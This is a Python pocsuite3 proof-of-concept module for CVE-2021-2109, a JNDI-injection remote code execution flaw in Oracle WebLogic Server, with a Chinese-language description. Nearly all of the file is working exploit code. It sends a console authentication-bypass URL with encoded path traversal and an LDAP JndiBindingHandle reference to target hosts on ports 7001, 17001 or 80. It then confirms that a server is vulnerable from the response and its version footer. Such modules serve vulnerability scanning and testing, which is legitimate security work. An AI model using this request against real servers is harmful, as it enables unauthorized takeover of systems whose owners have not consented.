#!/usr/bin/env python3
# coding: utf-8

import re
import time
import requests
import sys
import http.client

from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

VUL = ['CVE-2021-2109']

_tiemout = 3
# 默认输出所有结果，包括不存在漏洞的

requests.packages.urllib3.disable_warnings()
headers_wls_1213 = {
 'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
 'Content-Type':'text/xml'
}

def check_weblogic(target, port):
  url = '{}/console/css/%25%32%65%25%32%65%25%32%66/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&cqqhandle=com.bea.console.handles.JndiBindingHandle(%22ldap://127;0.0.1:{}/Exploit;AdminServer%22)'.format(target, port)
  try:
      bypass_1 = requests.get(url, headers=headers_wls_1213, timeout=_tiemout, verify=False)
      if bypass_1.status_code == 200 and 'JNDI' in bypass_1.text:
          m = re.findall('<p id="footerVersion">(.*?)</p>', bypass_1.text)
          if m:
              return True, m[0]
  except Exception as e:
      return False, None
      # print(e)
      pass

class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = 'fg'
    vulDate = '2020-02-20'
    createDate = '2020-07-15'
    updateDate = '2020-07-15'
    references = []
    name = 'Weblogic-CVE-2021-2109命令执行漏洞'
    appPowerLink = ''
    appName = "Oracle WebLogic Server是一个适用于云环境和传统环境的应用服务器组件，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。影响产品：10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0"
    appVersion = ''
    vulType = 'Weblogic中间件漏洞'
    category = ''
    desc = '''
            CVE-2021-2109 Weblogic RCE
    '''

    def _verify(self):
        ports = []
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [17001, 7001, 80]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            status = False
            try:
                res = requests.get(uri, verify=False, timeout=2)
                # print(res.text)
                if 'Error 404--Not Found' in res.text:
                    status, msg = check_weblogic(uri, str(port))
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo'][
                        'URL'] = uri + '/console/css/%25%32%65%25%32%65%25%32%66/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&cqqhandle=com.bea.console.handles.JndiBindingHandle(%22ldap://127;0.0.1:{}/Exploit;AdminServer%22)'.format(str(port))
                    result['extra'] = {}
                    result['extra']['evidence'] = msg
                    break
            except Exception as e:
                print(e)
                pass

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output

register_poc(TestPOC)